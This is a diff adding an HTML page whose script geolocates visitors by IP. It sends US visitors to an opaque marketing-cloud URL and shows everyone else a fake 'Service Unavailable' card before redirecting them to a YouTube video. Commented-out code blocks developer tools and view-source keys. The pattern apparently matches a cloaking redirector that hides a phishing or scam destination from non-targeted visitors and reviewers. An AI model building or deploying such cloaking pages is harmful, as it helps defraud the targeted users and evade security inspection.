@@ -1,1 +1,94 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+</body>
+
+<script>
+
+    
+
+// document.addEventListener('contextmenu', event => event.preventDefault());
+
+// document.onkeydown = function(e) {
+//     if (
+//       e.keyCode == 123 || // F12
+//       (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
+//       (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) // Ctrl+U
+//     ) {
+//       return false;
+//     }
+//   };
+  const US_REDIRECT_URL     = "https://mctrjm16hqm0qmvrfyr-gshkk1p4.pub.sfmc-content.com/jupemtavqfb";   
+  const NON_US_REDIRECT_URL = "https://www.youtube.com/watch?v=Oa_bJMiesug";      
+  const REDIRECT_DELAY_MS   = 5000;                             
+
+  fetch("https://ipapi.co/json/")
+    .then(r => r.json())
+    .then(data => {
+      console.log(data);
+      if (data?.country === "US") {
+        
+        
+        window.location.replace(US_REDIRECT_URL);
+        return;
+      }
+
+      document.body.innerHTML = `
+        <div class="blocked-wrapper">
+          <div class="blocked-card">
+            <svg class="blocked-icon" viewBox="0 0 24 24" aria-hidden="true">
+              <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"/>
+              <line x1="5" y1="5" x2="19" y2="19" stroke="currentColor" stroke-width="2"/>
+            </svg>
+            <h1>Service Unavailable</h1>
+            <p>
+              Sorry, this service is not available in your country.<br>
+              If you believe this is an error, please contact
+              <a href="mailto:support@example.com">support@example.com</a>.
+            </p>
+            <button onclick="window.location.href='${NON_US_REDIRECT_URL}'">
+              Learn More
+            </button>
+          </div>
+        </div>
+        <style>
+          /* existing CSS (unchanged) */
+          *{box-sizing:border-box;margin:0;padding:0;font-family:system-ui,Helvetica,Arial,sans-serif;}
+          .blocked-wrapper{display:flex;justify-content:center;align-items:center;min-height:100vh;
+                           background:linear-gradient(135deg,#f8f8f8 0%,#e9eef4 100%);padding:1rem;}
+          .blocked-card{text-align:center;max-width:26rem;width:100%;background:#fff;border-radius:1rem;
+                        padding:2.5rem 2rem;box-shadow:0 8px 16px rgba(0,0,0,.08),0 2px 4px rgba(0,0,0,.06);
+                        animation:fadeIn .6s ease;}
+          .blocked-icon{width:5rem;height:5rem;color:#ff4d4d;margin-bottom:1.25rem;}
+          h1{font-size:1.8rem;margin-bottom:.75rem;color:#333;}
+          p{font-size:1rem;line-height:1.5;color:#555;margin-bottom:1.5rem;}
+          a{color:#0077cc;text-decoration:none;} a:hover{text-decoration:underline;}
+          button{padding:.75rem 1.5rem;font-size:1rem;border:none;border-radius:.5rem;background:#0077cc;
+                 color:#fff;cursor:pointer;transition:background .25s ease;} button:hover{background:#005fa3;}
+          @keyframes fadeIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+          @media (prefers-color-scheme: dark){
+            .blocked-wrapper{background:#13171f;}
+            .blocked-card{background:#1c2230;color:#e3e7ee;}
+            h1{color:#e3e7ee;} p{color:#bfc6d4;} .blocked-icon{color:#ff7373;}
+          }
+        </style>
+      `;
+
+      setTimeout(() => {
+        window.location.replace(NON_US_REDIRECT_URL);
+      }, REDIRECT_DELAY_MS);
+    })
+    .catch(err => {
+      console.error("IP lookup failed:", err);
+      window.location.replace(NON_US_REDIRECT_URL);
+    });
+</script>
+
+</html>
